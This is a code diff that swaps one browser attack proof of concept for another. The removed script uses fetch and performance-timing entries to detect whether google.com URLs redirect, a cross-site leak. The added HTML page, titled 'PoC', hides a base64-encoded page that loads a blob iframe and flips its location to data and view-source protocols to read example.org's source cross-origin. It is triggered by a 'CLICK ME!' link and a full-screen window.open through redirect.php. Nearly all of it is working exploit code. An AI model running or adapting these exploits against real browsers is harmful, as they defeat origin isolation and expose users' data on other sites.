@@ -1,25 +1,53 @@
-<script>
-    (async () => {
-        const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
-        async function isRedirect (url1) {
-            const a = await fetch(url1, { 'mode': 'no-cors', credentials: 'include', cache: 'no-store' });
-            await sleep(1000);
-            const performanceEntry = performance.getEntriesByName(url1)[0];
-            //console.log(performanceEntry, performanceEntry.startTime, performanceEntry.fetchStart);
-            if ( (performanceEntry.fetchStart - performanceEntry.startTime) > 5 ) {
-                console.log(`${url1} is a redirect?`);
-                return true;
-            } else {
-                console.log(`${url1} is not a redirect`);
-                return false;
-            }
-        }
-        const url1 = 'https://google.com/';
-        const url2 = 'https://www.google.com/';
-        console.log('Starting test');
-        await isRedirect(url1);
-        await isRedirect(url2);
-        console.log('Finished test');
-        
-    })();
-</script>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC</title>
+    <script>
+    function poc() {
+/*
+-- before --
+<html>
+<head>
+    <script>
+    function unescapeHTML(str) {
+        return str.replace(/&lt;/g,'<')
+                  .replace(/&gt;/g,'>')
+                  .replace(/&amp;/g,'&');
+    }
+
+    function poc() {
+        var text = ['iframe!'];
+        var blob = new Blob(text, {type : 'text/html'});
+        var url  = window.URL.createObjectURL(blob);
+
+        var iframe = document.getElementById('iframe');
+        iframe.src =  url;
+        setTimeout('iframe.contentWindow.location.protocol = "data"', 1000);
+        setTimeout('iframe.contentWindow.location.pathname="view-source:http://example.org"', 2000);
+        setTimeout('iframe.contentWindow.location.protocol="view-source"', 3000);
+        setTimeout('alert(unescapeHTML(iframe.contentWindow.document.body.innerHTML))', 4000);
+    }
+    <\/script> // <-- ******** If do base64 encode, please exclusion '\'. ********
+</head>
+<body onload="poc()">
+    <iframe id="iframe"></iframe>
+</body>
+</html>
+
+-- after --
+PGh0bWw+DQo8aGVhZD4NCiAgICA8c2NyaXB0Pg0KICAgIGZ1bmN0aW9uIHVuZXNjYXBlSFRNTChzdHIpIHsNCiAgICAgICAgcmV0dXJuIHN0ci5yZXBsYWNlKC8mbHQ7L2csJzwnKQ0KICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyZndDsvZywnPicpDQogICAgICAgICAgICAgICAgICAucmVwbGFjZSgvJmFtcDsvZywnJicpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHBvYygpIHsNCiAgICAgICAgdmFyIHRleHQgPSBbJ2lmcmFtZSEnXTsNCiAgICAgICAgdmFyIGJsb2IgPSBuZXcgQmxvYih0ZXh0LCB7dHlwZSA6ICd0ZXh0L2h0bWwnfSk7DQogICAgICAgIHZhciB1cmwgID0gd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7DQoNCiAgICAgICAgdmFyIGlmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZnJhbWUnKTsNCiAgICAgICAgaWZyYW1lLnNyYyA9ICB1cmw7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sID0gImRhdGEiJywgMTAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnBhdGhuYW1lPSJ2aWV3LXNvdXJjZTpodHRwOi8vZXhhbXBsZS5vcmciJywgMjAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sPSJ2aWV3LXNvdXJjZSInLCAzMDAwKTsNCiAgICAgICAgc2V0VGltZW91dCgnYWxlcnQodW5lc2NhcGVIVE1MKGlmcmFtZS5jb250ZW50V2luZG93LmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKSknLCA0MDAwKTsNCiAgICB9DQogICAgPC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9InBvYygpIj4NCiAgICA8aWZyYW1lIGlkPSJpZnJhbWUiPjwvaWZyYW1lPg0KPC9ib2R5Pg0KPC9odG1sPg==
+*/
+        var blob = new Blob([atob('PGh0bWw+DQo8aGVhZD4NCiAgICA8c2NyaXB0Pg0KICAgIGZ1bmN0aW9uIHVuZXNjYXBlSFRNTChzdHIpIHsNCiAgICAgICAgcmV0dXJuIHN0ci5yZXBsYWNlKC8mbHQ7L2csJzwnKQ0KICAgICAgICAgICAgICAgICAgLnJlcGxhY2UoLyZndDsvZywnPicpDQogICAgICAgICAgICAgICAgICAucmVwbGFjZSgvJmFtcDsvZywnJicpOw0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIHBvYygpIHsNCiAgICAgICAgdmFyIHRleHQgPSBbJ2lmcmFtZSEnXTsNCiAgICAgICAgdmFyIGJsb2IgPSBuZXcgQmxvYih0ZXh0LCB7dHlwZSA6ICd0ZXh0L2h0bWwnfSk7DQogICAgICAgIHZhciB1cmwgID0gd2luZG93LlVSTC5jcmVhdGVPYmplY3RVUkwoYmxvYik7DQoNCiAgICAgICAgdmFyIGlmcmFtZSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdpZnJhbWUnKTsNCiAgICAgICAgaWZyYW1lLnNyYyA9ICB1cmw7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sID0gImRhdGEiJywgMTAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnBhdGhuYW1lPSJ2aWV3LXNvdXJjZTpodHRwOi8vZXhhbXBsZS5vcmciJywgMjAwMCk7DQogICAgICAgIHNldFRpbWVvdXQoJ2lmcmFtZS5jb250ZW50V2luZG93LmxvY2F0aW9uLnByb3RvY29sPSJ2aWV3LXNvdXJjZSInLCAzMDAwKTsNCiAgICAgICAgc2V0VGltZW91dCgnYWxlcnQodW5lc2NhcGVIVE1MKGlmcmFtZS5jb250ZW50V2luZG93LmRvY3VtZW50LmJvZHkuaW5uZXJIVE1MKSknLCA0MDAwKTsNCiAgICB9DQogICAgPC9zY3JpcHQ+DQo8L2hlYWQ+DQo8Ym9keSBvbmxvYWQ9InBvYygpIj4NCiAgICA8aWZyYW1lIGlkPSJpZnJhbWUiPjwvaWZyYW1lPg0KPC9ib2R5Pg0KPC9odG1sPg==')], {type : 'text/html'});
+        var url = window.URL.createObjectURL(blob);
+
+        x = (screen.width) / 1 - 10;
+        y = (screen.height) / 1 - 100;
+
+        window.open('redirect.php?url=' + url, 'blob', 'screenX=0,screenY=0,left=0,top=0,width='+x+',height='+y+',scrollbars=yes,toolbar=yes,menubar=yes,staus=yes,resizable=yes,location=yes');
+    }
+    </script>
+</head>
+<body>
+<a href="#" onclick="poc()">CLICK ME!</a>
+</body>
+</html>
